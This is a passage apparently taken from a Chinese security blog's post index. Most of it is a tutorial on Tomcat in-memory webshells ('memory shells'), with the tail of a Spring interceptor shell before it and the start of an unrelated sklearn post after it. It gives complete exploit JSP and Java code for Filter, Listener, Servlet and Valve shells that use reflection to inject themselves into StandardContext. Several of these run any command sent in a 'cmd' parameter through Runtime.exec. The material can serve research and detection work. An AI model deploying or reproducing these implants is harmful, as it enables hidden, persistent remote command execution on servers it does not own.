      adaptedInterceptors.add(shell_interceptor);\n    }\n\n    public class Shell_Interceptor implements HandlerInterceptor{\n        @Override\n        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n            String cmd = request.getParameter(\"cmd\");\n            if (cmd != null) {\n                try {\n                    Runtime.getRuntime().exec(cmd);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } catch (NullPointerException n) {\n                    n.printStackTrace();\n                }\n                return true;\n            }\n            return false;\n        }\n    }\n}\n```\n访问对应路由/inject\n<img src=\"/img/3-12/29.png\" >\n成功执行\n<img src=\"/img/3-12/30.png\" >\n\n\n​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             \n","tags":["web安全","java安全","内存马","Spring"],"categories":["java安全"]},{"title":"Tomcat内存马","url":"/2024/03/06/Tomcat内存马/","content":"\n\n\n# Tomcat内存马\n\n\n\n\n\n前置知识：[Tomcat架构](https://www.yuque.com/yyjccc/pk74ko/ksyiwpex52m9tkdi?view=doc_embed)\n\n参考：\n[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)\n[Java内存马系列-04-Tomcat 之 Listener 型内存马 | Drunkbaby’s Blog](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)\n[https://su18.org/post/memory-shell/](https://su18.org/post/memory-shell/)\n## 介绍\n就是根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上\n调式时候需要导入对应tomcat版本的jar包 \n**依赖**\n```xml\n<dependency>\n  <groupId>org.apache.tomcat</groupId>\n  <artifactId>tomcat-catalina</artifactId>\n  <version>8.5.31</version>\n</dependency>\n```\n\n根据Tomcat启动流程\n<img src=\"/img/3-6/1.png\" >\n\n\n会在ConfigContext#configureContext方法中从xml配置中读取配置，并注册servlet、listener、filter三大件\n\n## Filter型\n### Filter的使用\n```java\npackage com.yyjccc.memorytrojan.Tomcat;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebFilter;\nimport java.io.IOException;\n\n@WebFilter()\npublic class ShellFilter implements Filter {\n\n    @Override\n    public void init(FilterConfig filterConfig)  {\n        System.out.println(\"Filter 初始构造完成\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        System.out.println(\"执行了操作\");\n        chain.doFilter(request,response);\n    }\n\n    @Override\n    public void destroy() {\n        System.out.println(\"filter 销毁\");\n    }\n}\n\n```\nxml配置模式：\n```xml\n<filter> \n  <filter-name>filter</filter-name>\n  <filter-class>com.yyjccc.memorytrojan.Tomcat.ShellFilter</filter-class>\n</filter>\n<filter-mapping> \n  <filter-name>filter</filter-name>\n  <url-pattern>/filter</url-pattern>\n</filter-mapping>\n```\n注解配置：@WebFilter(\"/*\")\n\n\n\n### Filter创建流程分析\n逆向走起\n在我们的dofilter方法上打上断点\n<img src=\"/img/3-6/2.png\" >\n这里观察函数栈帧，现在就根据函数调用栈逐层往上找filter是怎么程创建的\n进入上一层ApplicationFilterChain#internalDoFilter方法中\n<img src=\"/img/3-6/3.png\" >\n这里也是filter.doFilter()，且这个filter就是我们定义的filter。继续寻找这个filter怎么来的\n在这个方法内的前面\n<img src=\"/img/3-6/4.png\" >\nfilter是从filterConfig中获取，一个filterConfig对应一个Filter，用于存储Filter的上下文信息，而filterConfig是从属性filters -- ApplicationFilterConfig数组中获得。\n这里还没有看到filter到底来的，继续往上面一层栈帧\n<img src=\"/img/3-6/5.png\" >\n它主要是进行了 Globals.IS_SECURITY_ENABLED，也就是全局安全服务是否开启的判断。\n继续往上走，进入StandardWrapperValve#invoke方法中\n<img src=\"/img/3-6/6.png\" >\n这里filiterChain就是ApplicationFilterChain对象，找它怎么来的\n<img src=\"/img/3-6/7.png\" >\nApplicationFilterFactory#createFilterChain创建出filterChain\n在这里打上断点重新调试\n<img src=\"/img/3-6/8.png\" >\n其中的关键代码\n```java\npublic static ApplicationFilterChain createFilterChain(ServletRequest request,\n            Wrapper wrapper, Servlet servlet) {\n \n        ...\n        // Request dispatcher in use\n        filterChain = new ApplicationFilterChain();\n \n        filterChain.setServlet(servlet);\n        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());\n \n        // Acquire the filter mappings for this Context\n        StandardContext context = (StandardContext) wrapper.getParent();\n        FilterMap filterMaps[] = context.findFilterMaps();\n \n        ...\n \n        String servletName = wrapper.getName();\n \n        // Add the relevant path-mapped filters to this filter chain\n        for (FilterMap filterMap : filterMaps) {\n            \n            ...\n            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)\n                    context.findFilterConfig(filterMap.getFilterName());\n            ...\n \n            filterChain.addFilter(filterConfig);\n        }\n \n        ...\n \n        // Return the completed filter chain\n        return filterChain;\n    }\n```\n省略了函数中一些不重要的判断，从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程\n\n1. 首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象\n2. 然后通过wrapper.getParent()函数来获取StandardContext对象\n3. 接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息\n4. 最后根据Filter的名称，在StandardContext中获取FilterConfig\n5. 通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中\n\naddFilter():\n<img src=\"/img/3-6/9.png\" >\n这里就把获取到filterConfig中放入前面的属性中\n\n\n\n其实到这里是从context中拿到一些属性进行操作，将filterConfig放入到FilterChain中\n，Filter内存马的思路就是，在放入FilterChain之前我们就通过反射赋值或者增加一些内容，然后tomcat就会自动的调用上面流程的代码，将恶意的filter放入filterChain,再进行调用调用其实如下图：\n<img src=\"/img/3-6/10.png\" >\n\n**总之，注入内存马是在上游的操作，而上面分析的流程在下游部分**\n\n### FilterConfig、FilterDef和FilterMaps\nContext-Filter成分分析图：\n<img src=\"/img/3-6/11.png\" >\ncontext首尾相连了\n进入addFilter方法\n<img src=\"/img/3-6/12.png\" >\n发现，这里以前的filters数组原来会重新创建一个容量更大的数组，并拷贝原有的数组。\n\n- FilterConfig\n\n其中filterConfigs包含了当前的上下文信息StandardContext、以及filterDef等信息\n上下文对象StandardContext实际上是包含FilterConfig、FilterDef和FilterMaps了这三者的\n<img src=\"/img/3-6/13.png\" >\n查看context:\n\n- filterDef\n\n其中filterDef存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<filter>标签。\n同下配置\n```xml\n<filter>\n  <filter-name></filter-name>\n  <filter-class></filter-class>\n</filter>\n```\n<img src=\"/img/3-6/14.png\" >\n可以看到，filterDef必要的属性为filter、filterClass以及filterName。\n\n- filterDefs\n\nfilterDefs是一个HashMap，以键值对的形式存储filterDef\n<img src=\"/img/3-6/15.png\" >\n\n- filterMaps\n\n<img src=\"/img/3-6/16.png\" >\ncontext中的filterMaps中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<filter-mapping>标签\n等同于下面配置\n```xml\n<filter-mapping>\n    <filter-name></filter-name>\n    <url-pattern></url-pattern>\n</filter-mapping>\n```\nfilterMaps必要的属性为dispatcherMapping、filterName、urlPatterns\n\n于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。\n\n### 动态注册Filter\n根据成分分析图，其实动态注册的步骤就是对上面属性的赋值\n\n经过上面的分析，我们可以总结出动态添加恶意Filter的思路:\n\n1. 获取StandardContext对象\n2. 创建恶意Filter\n3. 使用FilterDef对Filter进行封装，并添加必要的属性\n4. 创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中\n5. 使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中\n\nStandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。\n\nTomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。\n这里获取context与后面Servlet第一种获取方式相同\n```java\n//获取ApplicationContextFacade类\nServletContext servletContext = request.getSession().getServletContext();\n\n//反射获取ApplicationContextFacade类属性context为ApplicationContext类\nField appContextField = servletContext.getClass().getDeclaredField(\"context\");\nappContextField.setAccessible(true);\nApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);\n\n//反射获取ApplicationContext类属性context为StandardContext类\nField standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\nstandardContextField.setAccessible(true);\nStandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);\n```\n恶意Filter\n```java\n<%!\n    public class CmdServlet implements Filter {\n\n        @Override\n        public void init(FilterConfig filterConfig)  {\n            System.out.println(\"shell\");\n        }\n\n        @Override\n        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n            Runtime.getRuntime().exec(\"calc\");\n            chain.doFilter(request,response);\n        }\n\n        @Override\n        public void destroy() {\n        }\n\t}\n%>\n```\n\n使用FilterDef封装filter\n这个过程和后面的注册Servlet十分类似\n```java\nString name=\"filterShell\";\nFilterDef filterDef = new FilterDef();\nfilterDef.setFilter(new CmdFilter());\nfilterDef.setFilterClass(CmdFilter.class.getName());\nfilterDef.setFilterName(name);\ncontext.addFilterDef(filterDef);\n```\n创建filterMap用于filter和路径的绑定\n```java\nFilterMap filterMap = new FilterMap();\n\tfilterMap.setFilterName(name);\n\tfilterMap.setDispatcher(DispatcherType.REQUEST.name());\n\tfilterMap.addURLPattern(\"/*\");\n\tcontext.addFilterMap(filterMap);\n```\n封装filterConfig及filterDef到filterConfigs\n使用ApplicationFilterConfig的构造方法，不过需要反射构造\n<img src=\"/img/3-6/17.png\" >\n```java\nField Configs = context.getClass().getDeclaredField(\"filterConfigs\");\nConfigs.setAccessible(true);\nMap filterConfigs = (Map) Configs.get(context);\nConstructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\nconstructor.setAccessible(true);\nApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);\nfilterConfigs.put(name, filterConfig);\n```\n\n### 完整exp\n```java\n<%!\n    public class CmdFilter implements Filter {\n\n        @Override\n        public void init(FilterConfig filterConfig)  {\n            System.out.println(\"shell\");\n        }\n\n        @Override\n        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n            Runtime.getRuntime().exec(\"calc\");\n            chain.doFilter(request,response);\n        }\n\n        @Override\n        public void destroy() {\n        }\n\t}\n%>\n\n\n\n<%\n    //获取ApplicationContextFacade类\n    ServletContext servletContext = request.getSession().getServletContext();\n\n//反射获取ApplicationContextFacade类属性context为ApplicationContext类\n    Field appContextField = servletContext.getClass().getDeclaredField(\"context\");\n    appContextField.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);\n\n//反射获取ApplicationContext类属性context为StandardContext类\n    Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\n    standardContextField.setAccessible(true);\n    StandardContext context = (StandardContext) standardContextField.get(applicationContext);\n%>\n\n<%\n    String name=\"filtershell\";\n    FilterDef filterDef = new FilterDef();\n\tfilterDef.setFilter(new CmdFilter());\n\tfilterDef.setFilterClass(CmdFilter.class.getName());\n\tfilterDef.setFilterName(name);\n\tcontext.addFilterDef(filterDef);\n%>\n\n<%\n    FilterMap filterMap = new FilterMap();\n\tfilterMap.setFilterName(name);\n\tfilterMap.setDispatcher(DispatcherType.REQUEST.name());\n\tfilterMap.addURLPattern(\"/bash\");\n\tcontext.addFilterMap(filterMap);\n%>\n\n\n<%\n    Field Configs = context.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(context);\n\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);\n    filterConfigs.put(name, filterConfig);\n%>\n\n```\n## Listener型\nListener用来监听对象创建、销毁、属性增删改，然后执行对应的操作。\n在Tomcat中，Listener->Filter->Servlet依次执行。\n\nListener就是来监听Session、Cookie、Servletd的\n\n\n根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种\n\n- ServletContextListener\n- HttpSessionListener\n- ServletRequestListener\n\n很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。下面我们来实现一个恶意的Listener\n```java\npackage com.yyjccc.memorytrojan;\n\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport javax.servlet.annotation.WebListener;\nimport javax.servlet.http.HttpServletRequest;\nimport java.io.IOException;\n\n\n@WebListener\npublic class ShellListener implements ServletRequestListener {\n\t@Override\n\tpublic void requestDestroyed(ServletRequestEvent sre) {\n\t\tSystem.out.println(\"销毁\");\n\t}\n\n\t@Override\n\tpublic void requestInitialized(ServletRequestEvent sre) {\n\t\tHttpServletRequest request = (HttpServletRequest) sre.getServletRequest();\n\t\tString cmd=request.getParameter(\"cmd\");\n\t\tif (cmd != null) {\n\t\t\ttry {\n\t\t\t\tRuntime.getRuntime().exec(cmd);\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (NullPointerException n) {\n\t\t\t\tn.printStackTrace();\n\t\t\t}\n\t\t}\n\n\t}\n}\n\n```\n访问任意路由都可执行命令\n### Listener创建过程\n断点达到requestInitialized（）方法内，查看是怎么调用到listener初始化的\n进入StandarContext#fireRequestInitEvent中\n<img src=\"/img/3-6/18.png\" >\n可以看到linstener怎么获取的\n进入getApplicationEventListeners()\n<img src=\"/img/3-6/19.png\" >\n直接就是返回属性，查看这个属性有怎么调用\n<img src=\"/img/3-6/20.png\" >\n<img src=\"/img/3-6/21.png\" >\n找到addApplicationEventListener方法\n### 注入Listener\n\n- 获取context\n\n在StandardHostValve#invoke中(就是刚才的函数栈帧往上一层)，可以看到其通过request对象来获取StandardContext类\n<img src=\"/img/3-6/22.png\" >\n同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取\n```java\n<%\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    //这里的Request为org.apache.catalina.connector.Request\n    StandardContext context = (StandardContext) req.getContext();\n%>\n```\n还有另一种获取方式如下\n```java\n<%\n\tWebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();\n%>\n```\n\n### 完整exp\n```java\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<html>\n<head>\n    <title>Title</title>\n</head>\n<body>\n<%!\n    public class CmdListener implements ServletRequestListener{\n        @Override\n        public void requestDestroyed(ServletRequestEvent sre) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent sre) {\n            try {\n                Runtime.getRuntime().exec(\"calc\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n%>\n\n<%\n    Field reqField = request.getClass().getDeclaredField(\"request\");\n\treqField.setAccessible(true);\n    Request req = (Request) reqField.get(request);\n    StandardContext context = (StandardContext) req.getContext();\n\n%>\n<%\n    CmdListener listener = new CmdListener();\n    context.addApplicationEventListener(listener);\n%>\n\n```\n## Servlet型\n### 恶意Servlet\n```java\n<%!\n    //jsp定义或者声明需要加上！\n    public class CmdServlet extends HttpServlet {\n        @Override\n        public void init(ServletConfig servletConfig){\n\n        }\n\n        @Override\n        public ServletConfig getServletConfig() {\n            return null;\n        }\n\n        @Override\n        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {\n            String cmd = servletRequest.getParameter(\"cmd\");\n            if(cmd!=null){\n                try {\n                    Runtime.getRuntime().exec(cmd);\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n        }\n\n        @Override\n        public String getServletInfo() {\n            return null;\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    }\n%>\n```\n### 注入Servlet\n内存马的关键就是如何注入内存马到web容器中，下面介绍如何注入Servlet\nConfigContext#configureContext注册Servlet流程\n基本流程，其他Servlet初始化操作忽略\n\n1. 由上下文context创建wrapper，用来包装servlet\n2. 设置Servlet名称\n3. 设置Servlet全类名\n\n(设置StandardWrapper对象的loadOnStartup属性值)\n```java\nwrapper.setLoadOnStartup(1);\n```\n<img src=\"/img/3-6/23.png\" > \n> **load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法). 这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序. 当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue())**\n\n<img src=\"/img/3-6/24.png\" >\n其中2，3操作对应web.xml中的如下配置\n```java\n <servlet>\n        <servlet-name>index</servlet-name>\n        <servlet-class>com.yyjccc.memorytrojan.HelloServlet</servlet-class>\n    </servlet>\n```\n\n4. wrapoer设置servlet\n5. 将wrapper放入context\n6. 添加url路径映射\n\n<img src=\"/img/3-6/25.png\" >\n其中第4步\n可以使用wrapper的setServlet方法\n第4、6步对应web.xml如下配置\n```java\n<servlet-mapping>\n        <servlet-name>index</servlet-name>\n        <url-pattern>/hello</url-pattern>\n    </servlet-mapping>\n```\n\n总体代码jsp实现\n```java\n<%\n    //2.注册进入context\n    //根据ContextConfig#configureContext方法注册servlet\n    //对应着xml配置文件配置Servlet\n    //设置名称和类\n    Wrapper wrapper = context.createWrapper();\n    wrapper.setName(\"test\");\n    wrapper.setServletClass(CmdServlet.class.getName());\n    wrapper.setServlet(new CmdServlet());\n    //设置映射路径\n    context.addChild(wrapper);\n    context.addServletMappingDecoded(\"/sh\",\"test\");\n%>\n```\n\n### StandarContext\n另外一个关键就是如何拿到context对象\n走进ConfigContext#configureContext\n发现context为StandarContext类型的对象\n<img src=\"/img/3-6/26.png\" >\n\n**获取context**\n\n- 从request对象的getServletContext方法中获取\n\nrequest对象的getServletContext方法获取servlet上下文\n```java\n  ServletContext servletContext = request.getServletContext();\n```\n<img src=\"/img/3-6/27.png\" >\n可以看到servletContext的属性context为ApplicationContext对象\n属性context的属性context为我们需要的StanddarContext对象\n无法直接拿到，那就通过反射获取\n```java\nField applicationContextField =  servletContext.getClass().getDeclaredField(\"context\");\napplicationContextField.setAccessible(true);\nApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);\n//反射获取StandardContext类型的属性context\nField contextField = applicationContext.getClass().getDeclaredField(\"context\");\ncontextField.setAccessible(true);\nStandardContext context = (StandardContext) contextField.get(applicationContext);\n```\n\n- request的request属性的getContext()方法\n```java\nField requestField = request.getClass().getDeclaredField(\"request\");\nrequestField.setAccessible(true);\nfinal Request request1 = (Request) requestField.get(request);\nStandardContext standardContext = (StandardContext) request1.getContext();\n```\n### 完整内存马\n```java\n<%!\n    //jsp定义或者声明需要加上！\n    public class CmdServlet extends HttpServlet {\n        @Override\n        public void init(ServletConfig servletConfig){\n\n        }\n\n        @Override\n        public ServletConfig getServletConfig() {\n            return null;\n        }\n\n        @Override\n        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {\n            String cmd = servletRequest.getParameter(\"cmd\");\n            if(cmd!=null){\n                try {\n                    Runtime.getRuntime().exec(cmd);\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n        }\n\n        @Override\n        public String getServletInfo() {\n            return null;\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    }\n%>\n\n<%\n    //动态注册\n    //1.获取StandardContext对象\n    ServletContext servletContext = request.getServletContext();\n    System.out.println(servletContext);\n    //反射获取ApplicationContext类型的属性context\n    Field applicationContextField =  servletContext.getClass().getDeclaredField(\"context\");\n    applicationContextField.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);\n    //反射获取StandardContext类型的属性context\n    Field contextField = applicationContext.getClass().getDeclaredField(\"context\");\n    contextField.setAccessible(true);\n    StandardContext context = (StandardContext) contextField.get(applicationContext);\n%>\n\n<%\n    //2.注册进入context\n    //根据ContextConfig#configureContext方法注册servlet\n    //对应着xml配置文件配置Servlet\n    //设置名称和类\n    Wrapper wrapper = context.createWrapper();\n    wrapper.setName(\"test\");\n    wrapper.setServletClass(CmdServlet.class.getName());\n    wrapper.setServlet(new CmdServlet());\n    //设置映射路径\n    context.addChild(wrapper);\n    context.addServletMappingDecoded(\"/sh\",\"test\");\n%>\n```\n### 优缺点\n缺点:\n- 这种类型的内存马需要访问具体路径才能够命令执行，日志中比较容易被发现\n\n优点:\n- 兼容性强，兼容tomcat7\n\n\n## Valve型\n### 管道机制\n 当Tomcat接收到客户端请求时，首先会使用Connector进行解析，然后发送到Container进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。\n管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制   \n<img src=\"/img/3-6/28.png\" >\n 在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。\n我们先来看看Pipeline接口，继承了Contained接口\n```java\npublic interface Pipeline extends Contained {\n \n    public Valve getBasic();\n \n    public void setBasic(Valve valve);\n \n    public void addValve(Valve valve);\n \n    public Valve[] getValves();\n \n    public void removeValve(Valve valve);\n\n    Valve getFirst();\n\n    boolean isAsyncSupported();\n \n    public void findNonAsyncValves(Set<String> result);\n}\n```\nPipeline接口提供了各种对Valve的操作方法，如我们可以通过addValve()方法来添加一个Valve。下面我们再来看看Valve接口\n```java\npublic interface Valve {\n \n    public Valve getNext();\n \n    public void setNext(Valve valve);\n \n    public void backgroundProcess();\n \n    public void invoke(Request request, Response response)\n        throws IOException, ServletException;\n \n    public boolean isAsyncSupported();\n}\n```\n其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。\n<img src=\"/img/3-6/29.png\" >\n同时Valve可以通过重写invoke()方法来实现具体的业务逻辑\n如下面代码\n```java\nclass Shell_Valve extends ValveBase {\n \n        @Override\n        public void invoke(Request request, Response response) throws IOException, ServletException {\n            ...\n            }\n        }\n    }\n```\n下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在org.apache.catalina.connector.CoyoteAdapter#service方法中\n```java\npublic void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {\n    Request request = (Request) req.getNote(ADAPTER_NOTES);\n        Response response = (Response) res.getNote(ADAPTER_NOTES);\n \n        if (request == null) {\n            // Create objects\n            request = connector.createRequest();\n            request.setCoyoteRequest(req);\n            response = connector.createResponse();\n            response.setCoyoteResponse(res);\n \n            // Link objects\n            request.setResponse(response);\n            response.setRequest(request);\n \n            // Set as notes\n            req.setNote(ADAPTER_NOTES, request);\n            res.setNote(ADAPTER_NOTES, response);\n \n            // Set query string encoding\n            req.getParameters().setQueryStringCharset(connector.getURICharset());\n        }\n...\n \n    try {\n            ...\n            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);\n            }\n...\n}\n```\n<img src=\"/img/3-6/30.png\" >\n前面是对Request和Respone对象进行一些判断及创建操作,在这里打断点进行调式\n```java\nconnector.getService().getContainer().getPipeline().getFirst().invoke(request, response);\n```\n首先通过connector.getService()来获取一个StandardService对象\n<img src=\"/img/3-6/31.png\" >\n接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象\n<img src=\"/img/3-6/32.png\" >\n再通过StandardPipeline.getFirst()获取第一个Valve\n<img src=\"/img/3-6/33.png\" >\n最后通过调用StandardEngineValve.invoke()来实现Valve的各种业务逻辑\n进入StandardEngineValve#invoke方法\n<img src=\"/img/3-6/34.png\" >\nhost.getPipeline().getFirst().invoke(request, response)实现调用后续的Valve。\n\n\n### 动态添加Valve\n上面过程就像逐个Valve出栈,每次getFirst()获取Valve后，然后再invoke()\n那么Valve就是注入一个恶意的Valve,我们知道一个网站对应一个Context\n就对应着StandarContext类中，其也管理了Valve；·\n直接寻找有无存储valve的属性,也就是实现了Pipeline接口的类\n<img src=\"/img/3-6/35.png\" >\n找到属性pipeline\n<img src=\"/img/3-6/36.png\" >\n这个属性在类中没有定义，说明是父类的。进入ContainerBase\n<img src=\"/img/3-6/37.png\" >\n找到方法addValve\n<img src=\"/img/3-6/38.png\" >\n根据上文的分析我们能够总结出Valve型内存马的注入思路\n\n1. 获取StandardContext对象\n2. 通过StandardContext对象获取StandardPipeline,即pipeline属性\n3. 编写恶意Valve\n4. 通过StandardPipeline.addValve()动态添加Valve\n\n获取StandardContext对象\n```java\nField reqF = request.getClass().getDeclaredField(\"request\");\nreqF.setAccessible(true);\nRequest req = (Request) reqF.get(request);\nStandardContext context = (StandardContext) req.getContext();\n```\n注入Valve\n\n- 实现接口\n```java\nPipeline pipeline = context.getPipeline();\npipeline.addValve(new Valve() {\n        @Override\n        public Valve getNext() {\n            return null;\n        }\n\n        @Override\n        public void setNext(Valve valve) {\n\n        }\n\n        @Override\n        public void backgroundProcess() {\n\n        }\n\n        @Override\n        public void invoke(Request request, Response response) throws IOException, ServletException {\n            Runtime.getRuntime().exec(\"calc\");\n        }\n\n        @Override\n        public boolean isAsyncSupported() {\n            return false;\n        }\n    });\n```\n\n- 继承ValveBase重写invoke\n```java\nPipeline pipeline = context.getPipeline();\n\tpipeline.addValve(new ValveBase() {\n        @Override\n        public void invoke(Request request, Response response) throws IOException, ServletException {\n            Runtime.getRuntime().exec(\"calc\");\n        }\n    });\n```\n\n\n\n### 完整exp\n```java\n\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"org.apache.catalina.Pipeline\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.catalina.valves.ValveBase\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<html>\n<head>\n    <title>Title</title>\n</head>\n<body>\n<%\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext context = (StandardContext) req.getContext();\n%>\n<%\n    Pipeline pipeline = context.getPipeline();\n\tpipeline.addValve(new ValveBase() {\n        @Override\n        public void invoke(Request request, Response response) throws IOException, ServletException {\n            Runtime.getRuntime().exec(\"calc\");\n        }\n    });\n%>\n</body>\n</html>\n\n```\n","tags":["java安全","内存马","Tomcat"],"categories":["java安全"]},{"title":"sklearn与特征工程","url":"/2024/02/27/sklearn与特征工程/","content":"\n\n\n# sklearn与特征工程 \n\n## 简介\n\n### sklearn\n\nScikit-learn（简称为 sklearn）是一个流行的 Python 机器学习库，用于在数据挖掘和数据分析领域中进行各种机器学习任务。它提供了简单而高效的工具，用于数据挖掘和数据分析，以及构建和评估各种机器学习模型。以下是关于 scikit-learn 的一些重要信息：\n\n**功能特点**：\n\n1. 简单而一致的 API： Scikit-learn 提供了简单而一致的 API，使得用户可以方便地使用各种机器学习算法和工具。\n2. 广泛的算法库： Scikit-learn 包含了大量的机器学习算法和工具，涵盖了分类、回归、聚类、降维、模型选择、预处理等多个方面。\n3. 易于使用的工具： Scikit-learn 提供了各种易于使用的工具，如数据预处理、特征提取、模型评估等，使得用户能够更轻松地进行机器学习任务的建模和评估。\n4. 高效的实现： Scikit-learn 的算法和工具都经过了高度优化和性能调整，以保证其在大规模数据集上的高效性和可扩展性。\n\n**主要模块**：\n\n1. sklearn.datasets： 包含了一些标准数据集，可以用于练习和测试机器学习算法。\n2. sklearn.preprocessing： 提供了数据预处理功能，如标准化、归一化、缺失值处理等。\n3. sklearn.feature_extraction： 提供了特征提取功能，如文本特征提取、图像特征提取等。\n4. sklearn.model_selection： 提供了模型选择和评估功能，如交叉验证、网格搜索、模型评估指标等。\n5. sklearn.metrics： 提供了常用的模型评估指标，如准确率、精确率、召回率、F1 值等。\n6. sklearn.linear_model： 提供了线性模型算法，如线性回归、逻辑回归等。\n7. sklearn.svm： 提供了支持向量机算法。\n8. sklearn.tree： 提供了决策树算法。\n9. sklearn.ensemble： 提供了集成学习算法，如随机森林、梯度提升树等。\n10. sklearn.cluster： 提供了聚类算法，如 K 均值聚类、层次聚类等。\n\n### 特征工程\n\n  